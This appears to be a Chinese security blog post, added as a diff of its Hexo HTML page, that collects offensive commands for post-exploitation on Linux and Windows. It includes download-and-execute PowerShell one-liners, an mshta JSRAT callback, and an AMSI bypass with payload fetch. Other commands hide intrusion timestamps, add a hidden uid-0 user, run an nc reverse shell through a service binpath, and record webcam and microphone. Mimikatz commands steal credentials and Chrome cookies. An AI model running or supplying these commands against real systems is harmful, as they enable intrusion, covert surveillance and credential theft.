@@ -1,0 +1,1346 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/MaiKeFee_Logo.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/MaiKeFee_Logo.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Linux Linux反弹shell后，方便的交互：python -c &amp;apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;apos;无python时：expect -c &amp;apos;spawn bash;interact&amp;apos;无wget nc等下载工具时下载文件exec 5&amp;lt;&amp;gt;/dev/tcp/sec-lab.org/80 &amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commands 搜集(持续更新)">
+<meta property="og:url" content="http://MaiKeFee.com/archives/7eaedcae.html">
+<meta property="og:site_name" content="MaiKeFee">
+<meta property="og:description" content="Linux Linux反弹shell后，方便的交互：python -c &amp;apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;apos;无python时：expect -c &amp;apos;spawn bash;interact&amp;apos;无wget nc等下载工具时下载文件exec 5&amp;lt;&amp;gt;/dev/tcp/sec-lab.org/80 &amp;a">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-28T08:48:39.226Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Commands 搜集(持续更新)">
+<meta name="twitter:description" content="Linux Linux反弹shell后，方便的交互：python -c &amp;apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;apos;无python时：expect -c &amp;apos;spawn bash;interact&amp;apos;无wget nc等下载工具时下载文件exec 5&amp;lt;&amp;gt;/dev/tcp/sec-lab.org/80 &amp;a">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://MaiKeFee.com/archives/7eaedcae.html">
+
+
+
+
+
+  <title>Commands 搜集(持续更新) | MaiKeFee</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">MaiKeFee</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一个兴趣使然的信息安全爱好者</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/7eaedcae.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Commands 搜集(持续更新)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T23:10:48+08:00">
+                2019-08-27
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:48:39+08:00">
+                2019-08-28
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/archives/7eaedcae.html" class="leancloud_visitors" data-flag-title="Commands 搜集(持续更新)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Linux</p>
+<h2 id="Linux反弹shell后，方便的交互："><a href="#Linux反弹shell后，方便的交互：" class="headerlink" title="Linux反弹shell后，方便的交互："></a>Linux反弹shell后，方便的交互：</h2><pre><code>python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><h2 id="无python时："><a href="#无python时：" class="headerlink" title="无python时："></a>无python时：</h2><pre><code>expect -c &apos;spawn bash;interact&apos;</code></pre><h2 id="无wget-nc等下载工具时下载文件"><a href="#无wget-nc等下载工具时下载文件" class="headerlink" title="无wget nc等下载工具时下载文件"></a>无wget nc等下载工具时下载文件</h2><pre><code>exec 5&lt;&gt;/dev/tcp/sec-lab.org/80 &amp;&amp;echo -e “GET /c.pl HTTP/1.0\n” &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl</code></pre><p>修改上传文件时间戳(掩盖入侵痕迹)</p>
+<p>touch -r 老文件时间戳 新文件时间戳<br>利用BASH提权</p>
+<h2 id="这个要求管理员有su的习惯，我们可以通过它来添加一个id-0的用户"><a href="#这个要求管理员有su的习惯，我们可以通过它来添加一个id-0的用户" class="headerlink" title="这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户"></a>这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户</h2><p>$PROMPT_COMMAND 利用这个变量保存了在主提示符$PS1显示之前需要执行的命令<br>导入:</p>
+<pre><code>export PROMPT_COMMAND=”/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND”</code></pre><h2 id="lsof-命令"><a href="#lsof-命令" class="headerlink" title="lsof 命令"></a>lsof 命令</h2><pre><code>lsof 1.txt 显示开启文件 abc.txt 的进程
+lsof -i :22 知道 22 端口现在运行什么程序
+lsof -c nsd 显示 nsd 进程现在打开的文件
+lsof -g gid 显示归属 gid 的进程情况
+lsof +d /usr/local/ 显示目录下被进程开启的文件
+lsof +D /usr/local/ 同上，但是会搜索目录下的目录，时间较长
+lsof -d 4 显示使用 fd 为4 的进程
+lsof -i [i] 用以显示符合条件的进程情况</code></pre><h2 id="SSH端口转发"><a href="#SSH端口转发" class="headerlink" title="SSH端口转发"></a>SSH端口转发</h2><p>下面文章详细描述了3种方式转发</p>
+<pre><code>http://www.cnblogs.com/david-zhang-index/archive/2012/08/18/2645943.html</code></pre><h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><pre><code>Exiftool “-comment&lt;=raj.php” 1.png</code></pre><p>Windows<br>Powershell 相关</p>
+<h3 id="获取无线密码："><a href="#获取无线密码：" class="headerlink" title="获取无线密码："></a>获取无线密码：</h3><pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1&apos;);Get-Wlan-Keys &quot;</code></pre><h3 id="提权加账号"><a href="#提权加账号" class="headerlink" title="提权加账号"></a>提权加账号</h3><pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user evi1cg test123 /add&apos;&quot;</code></pre><h3 id="下载执行："><a href="#下载执行：" class="headerlink" title="下载执行："></a>下载执行：</h3><pre><code>powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&apos;http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg&apos;,&apos;C:\\Users\Public\\test.jpg&apos;) &amp; start C:\\Users\\Public\\test.jpg</code></pre><h3 id="摄像头录像："><a href="#摄像头录像：" class="headerlink" title="摄像头录像："></a>摄像头录像：</h3><pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1&apos;); Capture-MiniEye -RecordTime 2 -Path $env:temp\hack.avi&quot;</code></pre><h3 id="录音"><a href="#录音" class="headerlink" title="录音:"></a>录音:</h3><pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&apos;);Get-MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias &apos;SECRET&apos;&quot;
+MSHTA
+VBSCRIPT EXEC
+
+mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)
+JAVASCRIPT EXEC
+
+mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);}
+JSRAT
+mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);}
+Bypass AMSI:
+PS C:\&gt; [Ref].Assembly.GetType(&apos;System.Management.Automation.AmsiUtils&apos;).GetField(&apos;amsiInitFailed&apos;,&apos;NonPublic,Static&apos;).SetValue($null,$true)
+use:
+
+powershell.exe -ExecutionPolicy Bypass -noprofile [Ref].Assembly.GetType(&apos;&apos;System.Management.Automation.AmsiUtils&apos;&apos;).GetField(&apos;&apos;amsiInitFailed&apos;&apos;,&apos;&apos;NonPublic,Static&apos;&apos;).SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString(&apos;&apos;http://192.168.230.1/msfpayload.ps1&apos;&apos;)
+Bypass AV
+sqlite3.exe -cmd &quot;select load_extension(&apos;1.txt&apos;,&apos;EP&apos;)&quot;
+sqlite3.exe -cmd &quot;select load_extension(&apos;\\192.168.1.101\share\1.txt&apos;,&apos;EP&apos;)&quot;</code></pre><p>mimikatz</p>
+<h3 id="获取vpn密码"><a href="#获取vpn密码" class="headerlink" title="获取vpn密码"></a>获取vpn密码</h3><pre><code>mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</code></pre><h3 id="读取chrome-cookies"><a href="#读取chrome-cookies" class="headerlink" title="读取chrome cookies"></a>读取chrome cookies</h3><pre><code>mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exit
+mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1&quot; exit
+mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit</code></pre><h3 id="提权常用"><a href="#提权常用" class="headerlink" title="提权常用"></a>提权常用</h3><p>// What system are we connected to?</p>
+<pre><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></pre><p>// Get the hostname and username (if available)</p>
+<pre><code>hostname
+
+echo %username%</code></pre><p>// Get users</p>
+<pre><code>net users
+net user [username]</code></pre><p>// Networking stuff</p>
+<pre><code>ipconfig /all</code></pre><p>// Printer?</p>
+<p>route print<br>// ARP-arific</p>
+<pre><code>arp -A</code></pre><p>// Active network connections</p>
+<pre><code>netstat -ano</code></pre><p>// Firewall fun (Win XP SP2+ only)</p>
+<pre><code>netsh firewall show state
+netsh firewall show config</code></pre><p>// Scheduled tasks</p>
+<pre><code>schtasks /query /fo LIST /v</code></pre><p>// Running processes to started services</p>
+<pre><code>tasklist /SVC
+net start</code></pre><p>// Driver madness</p>
+<pre><code>DRIVERQUERY</code></pre><p>// WMIC fun (Win 7/8 – XP requires admin)</p>
+<pre><code>wmic /?</code></pre><p>//Use wmic_info script!</p>
+<p>// WMIC: check patch level</p>
+<pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><p>// Search pathces for given patch</p>
+<pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot;</code></pre><p>// AlwaysInstallElevated fun</p>
+<pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code></pre><p>// Other commands to run to hopefully get what we need</p>
+<pre><code>dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.xml *.ini *.txt
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s</code></pre><p>// Service permissions</p>
+<pre><code>sc query
+sc qc [service_name]</code></pre><p>// Accesschk stuff download link</p>
+<pre><code>accesschk.exe /accepteula (always do this first!!!!!)
+accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
+accesschk.exe -uwcqv &quot;Authenticated Users&quot; * (won&apos;t yield anything on Win 8)
+accesschk.exe -ucqv [service_name]</code></pre><p>// Find all weak folder permissions per drive.</p>
+<pre><code>accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</code></pre><p>// Find all weak file permissions per drive.</p>
+<pre><code>accesschk.exe -uwqs Users c:\*.*
+accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</code></pre><p>// Binary planting</p>
+<pre><code>sc config [service_name] binpath= &quot;C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe&quot;
+sc config [service_name] obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+sc qc [service_name] (to verify!)
+net start [service_name]
+CMD
+
+%ProgramData:~0,1%%ProgramData:~9,2% /c echo</code></pre><h4 id="命令行下载"><a href="#命令行下载" class="headerlink" title="命令行下载"></a>命令行下载</h4><pre><code>certutil -urlcache -split -f example.com/file</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/df6dc829.html" rel="next" title="「应急响应」应急响应实战笔记,一个安全工程师的自我修养">
+                <i class="fa fa-chevron-left"></i> 「应急响应」应急响应实战笔记,一个安全工程师的自我修养
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/54ea983c.html" rel="prev" title="「木马变形」一句话木马的各种变形">
+                「木马变形」一句话木马的各种变形 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/MaiKeFee_Logo.png" alt="MaiKeFee">
+            
+              <p class="site-author-name" itemprop="name">MaiKeFee</p>
+              <p class="site-description motion-element" itemprop="description">不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/MaiKeFee" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:MaiKeFee@126.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux反弹shell后，方便的交互："><span class="nav-number">1.</span> <span class="nav-text">Linux反弹shell后，方便的交互：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无python时："><span class="nav-number">2.</span> <span class="nav-text">无python时：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无wget-nc等下载工具时下载文件"><span class="nav-number">3.</span> <span class="nav-text">无wget nc等下载工具时下载文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个要求管理员有su的习惯，我们可以通过它来添加一个id-0的用户"><span class="nav-number">4.</span> <span class="nav-text">这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsof-命令"><span class="nav-number">5.</span> <span class="nav-text">lsof 命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH端口转发"><span class="nav-number">6.</span> <span class="nav-text">SSH端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图片马"><span class="nav-number">7.</span> <span class="nav-text">图片马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取无线密码："><span class="nav-number">7.1.</span> <span class="nav-text">获取无线密码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权加账号"><span class="nav-number">7.2.</span> <span class="nav-text">提权加账号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载执行："><span class="nav-number">7.3.</span> <span class="nav-text">下载执行：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#摄像头录像："><span class="nav-number">7.4.</span> <span class="nav-text">摄像头录像：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#录音"><span class="nav-number">7.5.</span> <span class="nav-text">录音:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取vpn密码"><span class="nav-number">7.6.</span> <span class="nav-text">获取vpn密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读取chrome-cookies"><span class="nav-number">7.7.</span> <span class="nav-text">读取chrome cookies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权常用"><span class="nav-number">7.8.</span> <span class="nav-text">提权常用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#命令行下载"><span class="nav-number">7.8.1.</span> <span class="nav-text">命令行下载</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">MaiKeFee</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
